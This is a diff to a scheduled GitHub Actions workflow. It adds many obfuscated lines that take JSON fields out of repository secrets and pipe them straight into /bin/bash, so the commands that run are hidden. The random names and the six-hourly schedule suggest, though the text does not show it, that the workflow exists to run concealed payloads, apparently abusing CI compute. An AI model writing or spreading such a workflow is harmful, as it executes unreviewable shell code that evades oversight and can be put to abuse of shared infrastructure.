@@ -3,8 +3,8 @@ name: baixiaochu5678
 on:
   workflow_dispatch:
   schedule:
-    - cron: '24 3/6 * * *'
-jobs:  # 5636
+    - cron: '56 0/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
 
@@ -12,16 +12,25 @@ jobs:  # 5636
       - uses: actions/checkout@v4
       - name: baixiaochu5678
         env:
-          wl8922: ${{ secrets.wl8922 }}
+          ir1: ${{ secrets.ir1 }}
         run: |
-          echo $wl8922 | jq -r .ax8168 | /bin/bash
-          echo $u35 | jq -r .pelny1 | /bin/bash
-          echo $onwa46 | jq -r .ubup426 | /bin/bash
-          echo $hr6 | jq -r .qidq5836 | /bin/bash
-          echo $rhjen68 | jq -r .kdbl855 | /bin/bash
-          echo $rcct83 | jq -r .oe80 | /bin/bash
-          echo $moibc184 | jq -r .m4621 | /bin/bash
-          echo $vzmdm21 | jq -r .zjil651 | /bin/bash
-          echo $gvrml12 | jq -r .h30506 | /bin/bash
-          echo $vmqyv92 | jq -r .qnyjm1 | /bin/bash
+          echo $ir1 | jq -r .h3 | /bin/bash
+          echo $anusd1837 | jq -r .e3991 | /bin/bash
+          echo $vsvq4 | jq -r .m25 | /bin/bash
+          echo $v3643 | jq -r .bca404 | /bin/bash
+          echo $xzh7 | jq -r .f82540 | /bin/bash
+          echo $ayik10 | jq -r .juyh37886 | /bin/bash
+          echo $w7858 | jq -r .sq7111 | /bin/bash
+          echo $crqc42 | jq -r .dm9 | /bin/bash
+          echo $qce1685 | jq -r .gvw522 | /bin/bash
+          echo $n5582 | jq -r .jfb4908 | /bin/bash
+          echo $bdhv40442 | jq -r .kuuv5514 | /bin/bash
+          echo $xxquw4298 | jq -r .bk59888 | /bin/bash
+          echo $sssf74715 | jq -r .gel13 | /bin/bash
+          echo $ct5785 | jq -r .jig059 | /bin/bash
+          echo $d9 | jq -r .dr42122 | /bin/bash
+          echo $jftsn13 | jq -r .a2185 | /bin/bash
+          echo $gtuh8 | jq -r .qa6 | /bin/bash
+          echo $rw05 | jq -r .quw5 | /bin/bash
+          echo $pace78820 | jq -r .y634 | /bin/bash
 
